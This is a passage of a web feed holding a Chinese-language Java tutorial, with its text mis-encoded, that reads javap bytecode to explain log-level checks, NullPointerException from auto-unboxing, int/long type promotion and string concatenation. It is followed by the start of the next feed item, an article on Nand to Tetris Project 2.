#10</code>ï¼šå¦‚æœç­‰äº1åˆ™ç»§ç»­æ‰§è¡Œç´§è·Ÿçš„æŒ‡ä»¤ï¼Œå¦åˆ™è·³è½¬åˆ°ç¬¬10ä¸ª32bä½ç½®çš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œ</td></tr><tr><td><code>ne</code></td><td>è·Ÿ<code>eq</code>åè¿‡æ¥</td><td><code>ifne #12</code>ï¼š è·Ÿä¸Šé¢æ˜¯åè¿‡æ¥çš„æ„æ€</td></tr><tr><td><code>1</code></td><td>æ ˆä¸Šinté•¿åº¦çš„ç©ºé—´ï¼ˆ32bï¼‰</td><td>å‚è€ƒ<code>aload_1</code>ã€<code>iload_1</code>ã€<code>istore_1</code></td></tr><tr><td><code>2</code></td><td>æ ˆä¸Šlongé•¿åº¦çš„ç©ºé—´ï¼ˆ64bï¼‰</td><td>å‚è€ƒ<code>lload_2</code>ã€<code>lstore_2</code></td></tr><tr><td><code>invokestatic</code></td><td>è°ƒç”¨é™æ€æ–¹æ³•</td><td/></tr><tr><td><code>invokevirtual</code></td><td>è°ƒç”¨å®ä¾‹æ–¹æ³•</td><td/></tr><tr><td><code>invokespecial</code></td><td>è°ƒç”¨æ„é€ æ–¹æ³•ã€çˆ¶ç±»æ–¹æ³•ã€é‡å†™çš„å­ç±»æ–¹æ³•</td><td/></tr></tbody></table>
<h2 data-id="heading-1">1. é€šè¿‡javaå­—èŠ‚ç ç†è§£ä»£ç æ‰§è¡Œé¡ºåº</h2>
<p>æ¡ˆä¾‹ä¸€ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(Test.class);

    <span class="hljs-comment">// å†™æ³•ä¸€</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log1</span><span class="hljs-params">(FakeObj fakeObj)</span> {
        <span class="hljs-comment">// æ—¥å¿—æ¡†æ¶ä¼šè‡ªå·±åˆ¤æ–­æ—¥å¿—çº§åˆ«ï¼Œå¦‚æœæœ€ä½æ—¥å¿—çº§åˆ«æ˜¯infoï¼Œåˆ™è¯¥æ—¥å¿—ä¸ä¼šè¢«æ‰“å°å‡ºæ¥</span>
        log.debug(<span class="hljs-string">"params={}"</span>, JSONObject.toJSONString(fakeObj));
    }
    <span class="hljs-comment">// å†™æ³•äºŒ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log2</span><span class="hljs-params">(FakeObj fakeObj)</span> {
        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) {
            log.debug(<span class="hljs-string">"params={}"</span>, JSONObject.toJSONString(fakeObj));
        }
    }
}
</code></pre>
<p>ä¸Šé¢çš„ä»£ç ç¼–è¯‘åï¼Œä½¿ç”¨<code>javap -v Test.class</code>å‘½ä»¤æŸ¥çœ‹å…¶å¯¹åº”çš„å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log1</span><span class="hljs-params">(org.example.int_to_long.FakeObj)</span>;
    Code:
         <span class="hljs-number">0</span>: getstatic     #<span class="hljs-number">7</span>               <span class="hljs-comment">// Field log:Lorg/slf4j/Logger;</span>
         <span class="hljs-number">3</span>: ldc           #<span class="hljs-number">13</span>              <span class="hljs-comment">// String params={}</span>
         <span class="hljs-number">5</span>: aload_1
         <span class="hljs-number">6</span>: invokestatic  #<span class="hljs-number">15</span>              <span class="hljs-comment">// Method com/alibaba/fastjson/JSONObject.toJSONString:(Ljava/lang/Object;)Ljava/lang/String;</span>
         <span class="hljs-number">9</span>: invokeinterface #<span class="hljs-number">21</span>,  <span class="hljs-number">3</span>        <span class="hljs-comment">// InterfaceMethod org/slf4j/Logger.debug:(Ljava/lang/String;Ljava/lang/Object;)V</span>
        <span class="hljs-number">14</span>: <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log2</span><span class="hljs-params">(org.example.int_to_long.FakeObj)</span>;
    Code:
         <span class="hljs-number">0</span>: getstatic     #<span class="hljs-number">7</span>               <span class="hljs-comment">// Field log:Lorg/slf4j/Logger;</span>
         <span class="hljs-number">3</span>: invokeinterface #<span class="hljs-number">27</span>,  <span class="hljs-number">1</span>        <span class="hljs-comment">// InterfaceMethod org/slf4j/Logger.isDebugEnabled:()Z</span>
         <span class="hljs-number">8</span>: ifeq          <span class="hljs-number">25</span>               <span class="hljs-comment">// ifå¦‚æœä¸Šä¸€å¥æ‰§è¡Œç»“æœæ˜¯0(å³false)åˆ™è·³è½¬åˆ°è¡Œå·25å¤„ï¼Œæ˜¯1(tru</span>
)åˆ™ç»§ç»­
        <span class="hljs-number">11</span>: getstatic     #<span class="hljs-number">7</span>               <span class="hljs-comment">// Field log:Lorg/slf4j/Logger;</span>
        <span class="hljs-number">14</span>: ldc           #<span class="hljs-number">13</span>              <span class="hljs-comment">// String params={}</span>
        <span class="hljs-number">16</span>: aload_1
        <span class="hljs-number">17</span>: invokestatic  #<span class="hljs-number">15</span>              <span class="hljs-comment">// Method com/alibaba/fastjson/JSONObject.toJSONString:(Ljava/lang/Object;)Ljava/lang/String;</span>
        <span class="hljs-number">20</span>: invokeinterface #<span class="hljs-number">21</span>,  <span class="hljs-number">3</span>        <span class="hljs-comment">// InterfaceMethod org/slf4j/Logger.debug:(Ljava/lang/String;Ljava/lang/Object;)V</span>
        <span class="hljs-number">25</span>: <span class="hljs-keyword">return</span>
</code></pre>
<p>é€šè¿‡å­—èŠ‚ç å¯ä»¥çœ‹å‡ºï¼Œ<code>log1</code>ä¸­ç¬¬6è¡Œæ˜¯æ‰§è¡Œ<code>toJSONString()</code>æ–¹æ³•ï¼Œç„¶åæ‰§è¡Œçš„<code>log.debug</code>ï¼Œè€Œ<code>log2</code>æ–¹æ³•ä¸­æ˜¯å…ˆæ‰§è¡Œ<code>isDebugEnabled</code>åï¼Œæ ¹æ®å…¶ç»“æœå†æ‰§è¡Œ<code>toJSONString()</code>å’Œ<code>log.debug</code>ï¼Œç”±äºç”Ÿäº§ç¯å¢ƒä¸­ä¸€èˆ¬ä¸å¼€å¯<code>debug</code>æ—¥å¿—çº§åˆ«ï¼Œæ‰€ä»¥<code>log2</code>æ–¹æ³•å¯ä»¥åœ¨ä¸å¼€å¯<code>debug</code>æ—¥å¿—çº§åˆ«æ—¶ä¸æ‰§è¡Œ<code>toJSONString()</code>ï¼Œæ•…<code>log2</code>çš„æ€§èƒ½æ›´å¥½ã€‚ä½†æ˜¯å¯¹äº<code>info</code>ã€<code>warn</code>å’Œ<code>error</code>åˆ™ä¸éœ€è¦è¿™æ ·å¢åŠ æ—¥å¿—çº§åˆ«åˆ¤æ–­äº†ï¼Œå› ä¸ºå¤§éƒ¨åˆ†æ—¶å€™ç”Ÿäº§ç¯å¢ƒéƒ½ä¼šå¼€å¯è¿™3ä¸ªæ—¥å¿—çº§åˆ«çš„ã€‚</p>
<h2 data-id="heading-2">2. é€šè¿‡javaå­—èŠ‚ç ç†è§£è£…ç®±å’Œæ‹†ç®±åˆ°åº•æ˜¯æ€æ ·çš„</h2>
<h3 data-id="heading-3">2.1 èµ‹å€¼æ—¶è‡ªåŠ¨æ‹†ç®±å¯èƒ½æŠ›NullPointerException</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{
        <span class="hljs-type">Long</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">long</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a;
    }
}
</code></pre>
<p>ä¸Šé¢çš„ä»£ç åœ¨æŠŠå˜é‡<code>a</code>èµ‹å€¼ç»™<code>b</code>æ—¶å°±ä¼šæŠ›å‡º<code>NullPointerException</code>ï¼Œä½¿ç”¨<code>javap -v Test.class</code>å‘½ä»¤æŸ¥çœ‹å…¶å¯¹åº”çš„å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>;
    Code:
       <span class="hljs-number">0</span>: aload_0
       <span class="hljs-number">1</span>: invokespecial #<span class="hljs-number">1</span>        <span class="hljs-comment">// Method java/lang/Object."&lt;init&gt;":()V</span>
       <span class="hljs-number">4</span>: <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>;
    Code:
       <span class="hljs-number">0</span>: aconst_null             <span class="hljs-comment">// æŠŠå¸¸é‡nullçš„å¼•ç”¨å…¥æ ˆ</span>
       <span class="hljs-number">1</span>: astore_1                <span class="hljs-comment">// ç»™å˜é‡aèµ‹å€¼ä¸ºnull</span>
       <span class="hljs-number">2</span>: aload_1                 <span class="hljs-comment">// è¯»å–å˜é‡açš„å€¼</span>
       <span class="hljs-number">3</span>: invokevirtual #<span class="hljs-number">2</span>        <span class="hljs-comment">// Method java/lang/Long.longValue:()J</span>
       <span class="hljs-number">6</span>: lstore_2                <span class="hljs-comment">// æŠŠå˜é‡aè½¬æˆlongçš„ç»“æœèµ‹å€¼åˆ°ä¸´æ—¶å˜é‡bä¸Š</span>
       <span class="hljs-number">7</span>: <span class="hljs-keyword">return</span>
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°<code>main</code>æ–¹æ³•è¡Œå·ä¸º3çš„å­—èŠ‚ç è°ƒç”¨äº†<code>Long.longValue()</code>æ–¹æ³•ï¼Œè¡Œå·6çš„å­—èŠ‚ç æ‰æ˜¯æŠŠå˜é‡<code>a</code>èµ‹å€¼ç»™<code>b</code>ï¼Œæ˜¾ç„¶ç”±äº<code>a</code>æ˜¯<code>null</code>ï¼Œæ‰€ä»¥è°ƒç”¨<code>longValue()</code>æ–¹æ³•è‡ªç„¶ä¼šæŠ›ç©ºæŒ‡é’ˆäº†ã€‚</p>
<h3 data-id="heading-4">2.2 æ–¹æ³•ä¼ å‚æ—¶è‡ªåŠ¨æ‹†ç®±æŠ›NullPointerException</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{
        <span class="hljs-type">Long</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        increment(a);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">increment</span><span class="hljs-params">(<span class="hljs-type">long</span> n)</span>{
        <span class="hljs-keyword">return</span> n++;
    }
}
</code></pre>
<p>ä¸Šé¢æŠŠå˜é‡<code>a</code>ä¼ å‚ç»™æ–¹æ³•<code>increment</code>æ—¶å°±ä¼šæŠ›<code>NullPointerException</code>ï¼Œè¿˜æ˜¯ç”¨<code>javap -v Test.class</code>æŸ¥çœ‹å…¶å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>;
    Code:
       <span class="hljs-number">0</span>: aload_0
       <span class="hljs-number">1</span>: invokespecial #<span class="hljs-number">1</span>        <span class="hljs-comment">// Method java/lang/Object."&lt;init&gt;":()V</span>
       <span class="hljs-number">4</span>: <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>;
    Code:
       <span class="hljs-number">0</span>: aconst_null
       <span class="hljs-number">1</span>: astore_1
       <span class="hljs-number">2</span>: aload_1
       <span class="hljs-number">3</span>: invokevirtual #<span class="hljs-number">2</span>        <span class="hljs-comment">// Method java/lang/Long.longValue:()J</span>
       <span class="hljs-number">6</span>: invokestatic  #<span class="hljs-number">3</span>        <span class="hljs-comment">// Method increment:(J)J</span>
       <span class="hljs-number">9</span>: pop2
      <span class="hljs-number">10</span>: <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">increment</span><span class="hljs-params">(<span class="hljs-type">long</span>)</span>;
    Code:
       <span class="hljs-number">0</span>: lload_0
       <span class="hljs-number">1</span>: dup2
       <span class="hljs-number">2</span>: lconst_1
       <span class="hljs-number">3</span>: ladd
       <span class="hljs-number">4</span>: lstore_0
       <span class="hljs-number">5</span>: lreturn
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°<code>main</code>æ–¹æ³•è¡Œå·ä¸º3çš„å­—èŠ‚ç è°ƒç”¨äº†<code>Long.longValue()</code>æ–¹æ³•ï¼Œè¡Œå·6çš„å­—èŠ‚ç æ‰æ˜¯çœŸæ­£çš„æ‰§è¡Œ<code>increment</code>ï¼Œæ˜¾ç„¶ç”±äº<code>a</code>æ˜¯<code>null</code>ï¼Œæ‰€ä»¥è°ƒç”¨<code>longValue()</code>æ–¹æ³•ä¹Ÿä¼šæŠ›ç©ºæŒ‡é’ˆäº†ã€‚</p>
<h3 data-id="heading-5">2.3 ç”¨äºå¤§å°æ¯”è¾ƒæˆ–è¿ç®—æ—¶æ‹†ç®±æŠ›NullPointerException</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{
        <span class="hljs-type">Long</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">long</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
        <span class="hljs-keyword">if</span>(n1 == n2){
        }
    }
}
</code></pre>
<p>åŒæ ·ç”¨<code>javap -v Test.class</code>æŸ¥çœ‹å­—èŠ‚ç å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>;
    Code:
       <span class="hljs-number">0</span>: aload_0
       <span class="hljs-number">1</span>: invokespecial #<span class="hljs-number">1</span>        <span class="hljs-comment">// Method java/lang/Object."&lt;init&gt;":()V</span>
       <span class="hljs-number">4</span>: <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>;
    Code:
       <span class="hljs-number">0</span>: aconst_null
       <span class="hljs-number">1</span>: astore_1
       <span class="hljs-number">2</span>: lconst_1
       <span class="hljs-number">3</span>: lstore_2
       <span class="hljs-number">4</span>: aload_1
       <span class="hljs-number">5</span>: invokevirtual #<span class="hljs-number">2</span>        <span class="hljs-comment">// Method java/lang/Long.longValue:()J</span>
       <span class="hljs-number">8</span>: lload_2
       <span class="hljs-number">9</span>: lcmp
      <span class="hljs-number">10</span>: ifne          <span class="hljs-number">13</span>
      <span class="hljs-number">13</span>: <span class="hljs-keyword">return</span>
}
</code></pre>
<p>åŒæ ·çš„åœ¨è¡Œå·8çš„å­—èŠ‚ç é€šè¿‡<code>Long.longValue()</code>æ–¹æ³•æŠŠå˜é‡<code>n1</code>ä»<code>Long</code>è½¬æ¢æˆäº†<code>long</code>ï¼Œç„¶åè¡Œå·8ä¸ºåŠ è½½å˜é‡<code>n2</code>ï¼Œè¡Œå·9æ‰æ˜¯æ¯”è¾ƒä¸¤ä¸ª<code>long</code>ï¼ˆæ³¨æ„ä¸æ˜¯æ¯”è¾ƒ<code>Long</code>ï¼‰ã€‚</p>
<h2 data-id="heading-6">3. intå’Œlongç›´æ¥è®¡ç®—æ—¶ç»“æœåˆ°åº•æ˜¯intè¿˜æ˜¯long</h2>
<h3 data-id="heading-7">3.1 int+longè®¡ç®—</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
        <span class="hljs-type">long</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
        <span class="hljs-comment">// çœ‹çœ‹è¿™é‡Œåˆ°åº•æ˜¯è°ƒç”¨ä¸‹é¢çš„å“ªä¸ªprintæ–¹æ³•</span>
        print(i+l);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> {
        System.out.println(<span class="hljs-string">"i="</span> + i);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">long</span> l)</span> {
        System.out.println(<span class="hljs-string">"l="</span> + l);
    }
}
</code></pre>
<p>è¿™æ®µä»£ç è¾“å‡ºç»“æœæ˜¯<code>l=1</code> ï¼Œå³ç¬¬äºŒä¸ª<code>print</code>æ–¹æ³•ï¼ŒåŒæ ·ç”¨<code>javap -v Test.class</code>æŸ¥çœ‹å­—èŠ‚ç å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>;
    Code:
      stack=<span class="hljs-number">4</span>, locals=<span class="hljs-number">4</span>, args_size=<span class="hljs-number">1</span>
         <span class="hljs-number">0</span>: iconst_1
         <span class="hljs-number">1</span>: istore_1
         <span class="hljs-number">2</span>: lconst_1
         <span class="hljs-number">3</span>: lstore_2
         <span class="hljs-number">4</span>: iload_1            <span class="hljs-comment">// åŠ è½½å˜é‡i</span>
         <span class="hljs-number">5</span>: i2l                <span class="hljs-comment">// æŠŠå˜é‡iä»intè½¬æˆlong</span>
         <span class="hljs-number">6</span>: lload_2            <span class="hljs-comment">// åŠ è½½å˜é‡l</span>
         <span class="hljs-number">7</span>: ladd               <span class="hljs-comment">// è®¡ç®—i+l</span>
         <span class="hljs-number">8</span>: invokestatic  #<span class="hljs-number">7</span>   <span class="hljs-comment">// Method print:(J)V</span>
        <span class="hljs-number">11</span>: <span class="hljs-keyword">return</span>
</code></pre>
<p>è¿™è¯´æ˜ç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™å°±å·²ç»æŠŠ<code>i+l</code>è®¡ç®—åçš„ç±»å‹å›ºå®šä¸º<code>long</code>äº†ï¼Œæ‰€ä»¥è°ƒç”¨çš„ç›´æ¥å°±æ˜¯ç¬¬äºŒä¸ª<code>print</code>æ–¹æ³•ã€‚</p>
<h3 data-id="heading-8">3.2 intå’Œlongçš„ä¸‰å…ƒç»„è®¡ç®—</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
        <span class="hljs-type">long</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
        print(<span class="hljs-literal">true</span> ? i : l);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> {
        System.out.println(<span class="hljs-string">"i="</span> + i);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">long</span> l)</span> {
        System.out.println(<span class="hljs-string">"l="</span> + l);
    }
}
</code></pre>
<p>è¿™æ®µä»£ç è¾“å‡ºç»“æœä»ç„¶æ˜¯<code>l=1</code> ï¼Œå³ç¬¬äºŒä¸ª<code>print</code>æ–¹æ³•ï¼ŒåŒæ ·ç”¨<code>javap -v Test.class</code>æŸ¥çœ‹å­—èŠ‚ç å†…å®¹ï¼š</p>
<pre><code class="hljs language-java" lang="java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>;
    Code:
      stack=<span class="hljs-number">2</span>, locals=<span class="hljs-number">4</span>, args_size=<span class="hljs-number">1</span>
         <span class="hljs-number">0</span>: iconst_1
         <span class="hljs-number">1</span>: istore_1
         <span class="hljs-number">2</span>: lconst_1
         <span class="hljs-number">3</span>: lstore_2
         <span class="hljs-number">4</span>: iload_1            <span class="hljs-comment">// åŠ è½½å˜é‡i</span>
         <span class="hljs-number">5</span>: i2l                <span class="hljs-comment">// æŠŠå˜é‡iä»intè½¬æˆlong</span>
         <span class="hljs-number">6</span>: invokestatic  #<span class="hljs-number">7</span>   <span class="hljs-comment">// Method print:(J)V</span>
         <span class="hljs-number">9</span>: <span class="hljs-keyword">return</span>
</code></pre>
<p>å¯è§å°½ç®¡<code>print</code>æ–¹æ³•çš„å…¥å‚å®é™…æ˜¯å˜é‡<code>int</code>ç±»å‹çš„<code>i</code>ï¼Œ ç¼–è¯‘å™¨ä»ç„¶ä¼šæŠŠ<code>i</code>å¼ºè½¬æˆ<code>long</code>ï¼Œç„¶åå›ºå®šè°ƒç”¨ç¬¬äºŒä¸ª<code>print</code>æ–¹æ³•</p>
<h2 data-id="heading-9">4. å­—ç¬¦ä¸²ç›¸åŠ è·ŸStringBuilderå…¶å®æ˜¯ä¸€æ ·çš„æ•ˆæœ</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">(String a, String b)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> a + b;
        System.out.println(str);
    }
}
</code></pre>
<p>åŒæ ·ç”¨<code>javap -v Test.class</code>æŸ¥çœ‹å­—èŠ‚ç å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">(java.lang.String, java.lang.String)</span>;
    descriptor: (Ljava/lang/String;Ljava/lang/String;)V
    flags: (<span class="hljs-number">0x0001</span>) ACC_PUBLIC
    Code:
      stack=<span class="hljs-number">2</span>, locals=<span class="hljs-number">4</span>, args_size=<span class="hljs-number">3</span>
         <span class="hljs-number">0</span>: aload_1                <span class="hljs-comment">// åŠ è½½å˜é‡a</span>
         <span class="hljs-number">1</span>: aload_2                <span class="hljs-comment">// åŠ è½½å˜é‡B</span>
         <span class="hljs-number">2</span>: invokedynamic #<span class="hljs-number">7</span>,  <span class="hljs-number">0</span>   <span class="hljs-comment">// InvokeDynamic #0:makeConcatWithConstants:(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</span>
         <span class="hljs-number">7</span>: astore_3
         <span class="hljs-number">8</span>: getstatic     #<span class="hljs-number">11</span>      <span class="hljs-comment">// Field java/lang/System.out:Ljava/io/PrintStream;</span>
        <span class="hljs-number">11</span>: aload_3
        <span class="hljs-number">12</span>: invokevirtual #<span class="hljs-number">17</span>      <span class="hljs-comment">// Method java/io/PrintStream.println:(Ljava/lang/String;)V</span>
        <span class="hljs-number">15</span>: <span class="hljs-keyword">return</span>

SourceFile: <span class="hljs-string">"Test.java"</span>
BootstrapMethods:
  <span class="hljs-number">0</span>: #<span class="hljs-number">41</span> REF_invokeStatic java/lang/invoke/StringConcatFactory.makeConcatWithConstants:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/invoke/CallSite;
    Method arguments:
      #<span class="hljs-number">39</span> \u0001\u0001
InnerClasses:
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> #<span class="hljs-number">52</span>= #<span class="hljs-number">48</span> of #<span class="hljs-number">50</span>;    <span class="hljs-comment">// Lookup=class java/lang/invoke/MethodHandles$Lookup of class java/lang/invoke/MethodHandles</span>
</code></pre>
<p><code>test1</code>æ–¹æ³•å­—èŠ‚ç çš„ç¬¬2è¡Œæ˜¯è°ƒç”¨çš„ <code>StringConcatFactory.makeConcatWithConstants</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯ï¼Œ<code>String</code>; è¿™ä¸ªæŒ‡ä»¤å®é™…ä¸Šæ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åˆ›å»ºä¸€ä¸ª <code>StringBuilder</code>ï¼Œå¹¶å°†æ‹¼æ¥çš„å­—ç¬¦ä¸²å¸¸é‡åŠ å…¥å…¶ä¸­ï¼Œæœ€ç»ˆè¿”å›æ‹¼æ¥åçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´è·Ÿæˆ‘ä»¬è‡ªå·±ç›´æ¥å†™<code>StringBuilder</code>å…¶å®æ˜¯å·®ä¸å¤šçš„ï¼Œåªæ˜¯å†™èµ·æ¥æ›´ç®€æ´ä¸€äº› ã€‚</p>
<p>ï¼ˆæœ¬æ–‡æåˆ°çš„å­—èŠ‚ç ä¸­çš„è¡Œå·å…¶å®æ˜¯å­—èŠ‚ç æŒ‡ä»¤å ç”¨ç©ºé—´çš„åç§»é‡ï¼Œä¸ºäº†ä¾¿äºç†è§£ï¼Œæš‚ä»¥è¡Œå·æ¥ç†è§£ ï¼ŒåŒæ—¶ä¸ºäº†æ–¹ä¾¿é˜…è¯»å­—èŠ‚ç ï¼Œç§»é™¤äº†å­—èŠ‚ç ä¸­çš„<code>flags</code>ã€<code>descriptor</code>ã€<code>LineNumberTable</code>ã€<code>LocalVariableTable</code>ã€<code>StackMapTable</code>ã€<code>static</code>é™æ€è¯­å¥å—çš„å†…å®¹ï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[From Nand to Tetris é‡Œçš„ Project 2]]></title>    <link>https://juejin.cn/post/7582791876367400998</link>    <guid>https://juejin.cn/post/7582791876367400998</guid>    <pubDate>2025-12-13T02:19:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582791876367400998" data-draft-id="7582425536463880218" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="From Nand to Tetris é‡Œçš„ Project 2"/> <meta itemprop="keywords" content="è®¾è®¡"/> <meta itemprop="datePublished" content="2025-12-13T02:19:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é‡‘éŠ€éŠ…éµ"/> <meta itemprop="url" content="https://juejin.cn/user/747323638159757"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            From Nand to Tetris é‡Œçš„ Project 2
